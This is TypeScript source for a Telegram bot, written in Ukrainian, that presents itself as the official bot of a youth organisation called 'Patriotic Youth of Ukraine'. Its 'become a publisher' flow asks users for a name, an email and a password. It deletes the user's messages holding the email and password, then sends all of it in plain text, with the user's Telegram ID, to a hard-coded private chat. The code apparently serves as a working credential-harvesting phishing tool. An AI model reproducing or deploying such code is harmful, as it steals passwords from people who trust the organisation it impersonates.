import fs from "fs";
import express from "express";
import TelegramBot from "node-telegram-bot-api";
import dotenv from "dotenv";

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN as string;
const LOG_CHAT_ID = -1002882015877;

if (!TELEGRAM_BOT_TOKEN)
  throw new Error("Missing TELEGRAM_BOT_TOKEN in environment variables");

export const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { webHook: true });

// ========== Utilities ==========
const validateEmail = (email: string): boolean =>
  /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.toLowerCase());
const escapeMarkdownV2 = (text: string): string =>
  text.replace(/([_*\[\]()~`>#+=|{}.!\\-])/g, "\\$1");

// ========== State Management ==========
type UserState = "awaiting_name" | "awaiting_email" | "awaiting_password" | null;
const userStates = new Map<number, UserState>();
const userData = new Map<number, {
  name?: string;
  email?: string;
  password?: string;
  emailMsgId?: number;
  passwordMsgId?: number;
}>();

// ========== Start Command ==========
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const caption = `*Вас вітає офіційний телеграм-бот Патріотичної молоді України* — громадської організації, яка формує свідоме покоління українців!

Наша місія — розвиток національної ідентичності, підтримка активної громадянської позиції та єднання молоді навколо спільних цінностей.

*🌟 Хочеш змін? Почни з себе та стань частиною команди, яка творить майбутнє!*

*📥 Заповнюй форму — і доєднуйся до нас, щоб діяти разом!*`;

  await bot.sendPhoto(chatId, fs.createReadStream("./public/hello.png"), {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🚀 Приєднатися", callback_data: "join" }],
        [{ text: "🔐 Стати паблішером", callback_data: "publisher" }],
        [
          { text: "ℹ️ Про нас", callback_data: "info" },
          { text: "❓ Підтримка", callback_data: "join" },
        ],
      ],
    },
  });
});

// ========== Callback Queries ==========
bot.on("callback_query", async (callbackQuery) => {
  const msg = callbackQuery.message;
  const data = callbackQuery.data;
  if (!msg || !data) return;

  const chatId = msg.chat.id;
  const messageId = msg.message_id;
  await bot.deleteMessage(chatId, messageId).catch(() => {});

  if (data.startsWith("accept_publisher_")) {
    const targetUserId = Number(data.replace("accept_publisher_", ""));
    try {
      await bot.sendMessage(targetUserId, "✅ Ваш запит було прийнято! \nВітаємо у команді!");
    } catch (err: any) {
      console.error("❌ Failed to notify user:", err.response?.body || err.message);
    }
    return;
  }

  if (data.startsWith("cancel_publisher_")) {
    const targetUserId = Number(data.replace("cancel_publisher_", ""));
    try {
      await bot.sendMessage(targetUserId, "❌ Ваш запит було відхилено. Ви можете звернутись пізніше.");
    } catch (err: any) {
      console.error("❌ Failed to notify user:", err.response?.body || err.message);
    }
    return;
  }

  switch (data) {
    case "join":
      bot.sendMessage(chatId, "Поділіться вашим...");
      break;

    case "publisher":
      bot.sendMessage(chatId, "Як до вас звертатись? \nВведіть, будь ласка, ваше ім'я");
      userStates.set(chatId, "awaiting_name");
      userData.set(chatId, {});
      break;

    case "menu":
      bot.sendPhoto(chatId, fs.createReadStream("./public/hello.png"), {
        caption: `*Вас вітає офіційний телеграм-бот Патріотичної молоді України* — громадської організації, яка формує свідоме покоління українців!

Наша місія — розвиток національної ідентичності, підтримка активної громадянської позиції та єднання молоді навколо спільних цінностей.

*🌟 Хочеш змін? Почни з себе та стань частиною команди, яка творить майбутнє!*

*📥 Заповнюй форму — і доєднуйся до нас, щоб діяти разом!*`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🚀 Приєднатися", callback_data: "join" }],
            [{ text: "🔐 Стати паблішером", callback_data: "publisher" }],
            [
              { text: "ℹ️ Про нас", callback_data: "info" },
              { text: "❓ Підтримка", callback_data: "join" },
            ],
          ],
        },
      });
      break;

    default:
      bot.sendMessage(chatId, "Unknown option.");
  }

  bot.answerCallbackQuery(callbackQuery.id);
});

// ========== Message Handler ==========
bot.on("message", (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text?.trim();
  if (!text) return;

  // ✅ Handle keyboard button presses
  if (text === "🚀 Приєднатися") {
    bot.sendMessage(chatId, "Поділіться вашим...");
    return;
  }

  if (text === "🔐 Стати паблішером") {
    bot.sendMessage(chatId, "Як до вас звертатись? \nВведіть, будь ласка, ваше ім'я");
    userStates.set(chatId, "awaiting_name");
    userData.set(chatId, {});
    return;
  }

  if (text === "ℹ️ Про нас") {
    bot.sendMessage(chatId, "Ми — Патріотична молодь України! Детальніше на сайті: https://pmu.org.ua");
    return;
  }

  if (text === "❓ Підтримка") {
    bot.sendMessage(chatId, "Звертайтесь на пошту: support@pmu.org.ua");
    return;
  }

  const state = userStates.get(chatId);
  if (!state) return;

  const data = userData.get(chatId) || {};

  switch (state) {
    case "awaiting_name":
      data.name = text;
      userData.set(chatId, data);
      userStates.set(chatId, "awaiting_email");
      bot.sendMessage(chatId, `Раді знайомству, ${data.name}! \nТепер додайте, будь ласка, адресу електронної пошти:`);
      break;

    case "awaiting_email":
      if (validateEmail(text)) {
        data.email = text;
        data.emailMsgId = msg.message_id;
        userData.set(chatId, data);
        userStates.set(chatId, "awaiting_password");
        bot.sendMessage(chatId, "Адресу електронної пошти додано! \nТепер придумайте пароль:");
      } else {
        bot.sendMessage(chatId, "Неправильна адреса електронної пошти, спробуйте ще раз:");
      }
      break;

    case "awaiting_password":
      data.password = text;
      data.passwordMsgId = msg.message_id;
      userData.set(chatId, data);

      // Delete sensitive messages
      if (data.emailMsgId) bot.deleteMessage(chatId, data.emailMsgId).catch(() => {});
      if (data.passwordMsgId) bot.deleteMessage(chatId, data.passwordMsgId).catch(() => {});

      // Log data to admin chat
      const logMessage = `
📝 *Новий запит на доступ до Паблішер Центру:*
👤 *Ім'я:* ${escapeMarkdownV2(data.name || "")}
📧 *Email:* \`${escapeMarkdownV2(data.email || "")}\`
🔐 *Пароль:* ||${escapeMarkdownV2(data.password || "")}||
🆔 *Telegram ID:* \`${chatId}\`
`;

      bot.sendMessage(LOG_CHAT_ID, logMessage, {
        parse_mode: "MarkdownV2",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "✅ Прийняти", callback_data: `accept_publisher_${chatId}` },
              { text: "❌ Відхилити", callback_data: `cancel_publisher_${chatId}` },
            ],
          ],
        },
      });

      // Notify user
      bot.sendPhoto(chatId, fs.createReadStream("./public/thanks.png"), {
        caption: `Пароль додано! Дякуємо, ${data.name}.\nВаш запит перебуває на розгляді.`,
        reply_markup: {
          inline_keyboard: [[{ text: "🏠 Головне Меню", callback_data: "menu" }]],
        },
      });

      // Cleanup
      userStates.delete(chatId);
      userData.delete(chatId);
      break;
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

if (process.env.VERCEL_URL) {
  const url = `https://${process.env.VERCEL_URL}/api/webhook`;
  bot.setWebHook(url);
}